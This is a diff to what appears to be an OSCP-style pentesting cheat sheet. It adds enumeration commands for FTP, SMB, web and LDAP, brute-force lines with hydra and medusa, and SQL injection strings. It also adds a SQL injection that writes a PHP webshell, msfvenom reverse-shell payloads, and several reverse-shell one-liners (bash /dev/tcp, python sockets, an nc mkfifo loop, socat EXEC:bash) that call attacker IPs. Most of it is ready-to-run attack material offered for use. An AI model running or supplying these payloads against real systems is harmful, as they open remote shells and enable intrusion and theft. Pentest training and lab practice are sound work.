@@ -59,6 +59,17 @@ curl -o <output file> http://<LHOST>/<FILE>
 kali> impacket-smbserver -smb2support <sharename> .
 win> copy file \\KaliIP\sharename
 ```
+- Using SMB
+```
+# for transferring large files like a db
+# if on linux, run sqlite3 and dump the db file
+# if on windows shell, start smb server on local machine with:
+- move to www directory
+- sudo impacket-smbserver share $(pwd) -smb2support -username <any username or for box> -passoword <same>
+- then on windows machine mount the smb drive: net use \\<ip>\share /u:<same name used to setup> <password>
+- then: copy dp.sqlite3 \\ip\share\db.sqlite3
+# once transferred, open with sqlite3 db.sqlite3
+```
 
 ## Discovering KDBX files
 1. In Windows
@@ -316,23 +327,36 @@ sudo ip r add <subnet> dev ligolo
 ftp <IP>
 #login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password
 
-put <file> #uploading file
-get <file> #downloading file
+#uploading file
+put <file>
+#downloading file
+get <file> 
 
 #NSE
 locate .nse | grep ftp
 nmap -p21 --script=<name> <IP>
 
+# If it’s TFTP, can nmap find anything interesting?
+sudo nmap -n -Pn -sU -oN tftp.txt -p 69 -sV --script tftp-enum $IP
+
 #bruteforce
 hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa
+medusa -u <username> -P /usr/share/wordlists/rockyou.txt -h <ip> -M ftp
+
+#Connecting to the FTP server using netcat.
+nc -v 192.168.2.142 21	
 
 # Check for vulnerabilities associated with the identified version.
+# if able to ftp and also other software on the server (like a web server on port 80)
+#	- look around for config files etc in program files, etc
+#	- google where specific software keeps config files
+# be mindful some directories like ProgramData are hidden!!
 ```
 ## SSH enumeration
 
 ```powershell
 #Login
-ssh uname@IP #enter the password in the prompt
+ssh uname@IP 
 
 #id_rsa or id_ecdsa file
 chmod 600 id_rsa/id_ecdsa
@@ -350,8 +374,12 @@ hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for user
 
 ## SMB enumeration
 
-```powershell
-sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided
+```
+# Always consider MS17-010 EternalBlue if Win 2008 - Server 2016
+# use psexec version of EB exploit
+
+#IP or range can be provided
+sudo nbtscan -r 192.168.50.0/24 
 
 #NSE scripts can be used
 locate .nse | grep smb
@@ -372,6 +400,7 @@ crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #spe
 
 # Smbclient
 smbclient -L //IP #or try with 4 /'s
+smbclient -N -L \\\\{TARGET_IP}\\
 smbclient //server/share
 smbclient //server/share -U <username>
 smbclient //server/share -U domain/username
@@ -381,10 +410,18 @@ smbmap -H <target_ip>
 smbmap -H <target_ip> -u <username> -p <password>
 smbmap -H <target_ip> -u <username> -p <password> -d <domain>
 smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
+smbmap -H <target_ip> --download "notes\note.txt"
+smbmap -H <target_ip> --upload test.txt "notes\test.txt"
+smbmap -R <name> -H <ip> -A <filename> -q #download a file to /usr/share/smbmap
+smbmap -u <username> -p <password> -d <domain> -Hh <ip> -x 'net group "Domain Admins" /domain
 
-#Within SMB session
-put <file> #to upload file
-get <file> #to download file
+#to upload file
+put <file>
+#to download file
+get <file>
+
+#nxc
+nxc smb <ip or domain> -u <username> -p <password>
 ```
 
 - Downloading shares is made easy—if the folder consists of several files, they will all be downloaded by this.
@@ -403,15 +440,27 @@ mget *
 - check /robots.txt folder
 - Look for the hostname and add the relevant one to `/etc/hosts` file.
 - Directory and file discovery - Obtain any hidden files that may contain juicy information
+- Use curl to check heaaders for versions: curl -I <ip>
 
 ```
 dirbuster
 gobuster dir -u http://example.com -w /path/to/wordlist.txt
-feroxbuster
+gobuster dir -u http://example.com -w /path/to/wordlist.txt -t 40 -q
+gobuster dir -u http://example.com -w /path/to/wordlist.txt -x php,html,txt,sh,py,rb # for certain file types
+gobuster dns -d http://example.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt # to enumerate DNS subdomains
+gobuster vhost -u http://example.com -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt # for Vhost subdomain enumeration, then add any to the hosts file
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://FUZZ.permx.htb/ -mc 200 -s # subdomains, filter by -fs (size) if all 200
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://ip -H "Host: FUZZ.permx.htb" -mc 200 -s # for headers, ADD ANY TO ETC/HOSTS
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://ip -H "Host: FUZZ.permx.htb" -c -fs 15949 # filter out by size
+ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt:FUZZ -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.doc' -H 'Cookie: PHPSESSID=fc2ujcg4iadc05kpeeivqidsjq' -fs 2985 #fuzz parameter like username in the middle of url: 
+
+feroxbuster -u http://example.com
 python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
 ```
 
-- Vulnerability Scanning using nikto: `nikto -h <url>`
+- Vulnerability Scanning using nikto: `nikto -h <url>` # can this be used for oscp??
 - `HTTPS`SSL certificate inspection, may reveal information like subdomains, usernames…etc
 - Default credentials: Identify the CMS or service, check for default credentials, and test them out.
 - Bruteforce
@@ -437,7 +486,7 @@ curl -i http://192.168.50.16:5002/users/v1
 
 - If there is any Input field check for **Remote Code execution** or **SQL Injection**
 - Check the URL, whether we can leverage **Local or Remote File Inclusion**.
-- Also check if there’s any file upload utility(also obtain the location it’s getting reflected)
+- Also check if there’s any file upload utility (also obtain the location it’s getting reflected)
 
 ### Wordpress
 
@@ -532,6 +581,9 @@ python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da
 
 #for privileged users
 python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
+
+# test for ldap injection: Use * as username and * as password and will login as first user
+
 ```
 
 ## NFS Enumeration
@@ -597,7 +649,7 @@ lsaenumsid #SID of all users
 
 ## Directory Traversal
 
-```powershell
+```
 cat /etc/passwd #displaying content through absolute path
 cat ../../../etc/passwd #relative path
 
@@ -616,7 +668,7 @@ http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Use
 
 - URL Encoding
 
-```powershell
+```
 #Sometimes it doesn't show if we try path, then we need to encode them
 curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
@@ -628,7 +680,7 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 - The main difference between Directory traversal and this attack is that we can execute commands remotely here.
 
-```powershell
+```
 #At first we need 
 http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here
 
@@ -644,7 +696,7 @@ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base
 
 - Remote file inclusion
 
-```powershell
+```
 1. Obtain a php shell
 2. host a file server 
 3.
@@ -654,7 +706,8 @@ we can also host a php reverseshell and obtain shell.
 
 ## SQL Injection
 
-```powershell
+```
+admin'#
 admin' or '1'='1
 ' or '1'='1
 " or "1"="1
@@ -677,18 +730,19 @@ admin' or '1'='1
 ") or ("1"="1"/*
 ") or ("1"="1"#
 ) or '1`='1-
+# Sqli for webshell: SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php”
 ```
 
 - Blind SQL Injection - This can be identified by Time-based SQLI
 
-```powershell
+```
 #Application takes some time to reload, here it is 3 seconds
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 ```
 
 - Manual Code Execution
 
-```powershell
+```
 kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
 EXECUTE sp_configure 'show advanced options', 1;
 RECONFIGURE;
@@ -709,7 +763,7 @@ http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
 
 ### Searchsploit
 
-```bash
+```
 searchsploit <name>
 searchsploit -m windows/remote/46697.py #Copies the exploit to the current location
 ```
@@ -718,7 +772,7 @@ searchsploit -m windows/remote/46697.py #Copies the exploit to the current locat
 
 ### Msfvenom
 
-```powershell
+```
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 
@@ -730,15 +784,24 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 
 ### One Liners
 
-```powershell
+```
+# sometimes weird ports will be blocked, best to test with 80 and 443 which are most likely to be open
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
+echo "os.system('bash -c "bash -i >& /dev/tcp/10.10.14.181/9001 0>&1"')" | tee -a tmp.py
+"echo 'os.system('bash -c "bash -i >& /dev/tcp/192.168.45.218/4444 0>&1"')' >> tmp.py"
+socat TCP:192.168.45.218:80 EXEC:bash
+'system("socat TCP:192.168.45.218:4444 EXEC:bash")'
+
 #For powershell use the encrypted tool that's in Tools folder
 ```
 
 <aside>
 💡 While dealing with PHP reverse shell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
+or pentestmonkey reverse shell
 
 </aside>
 
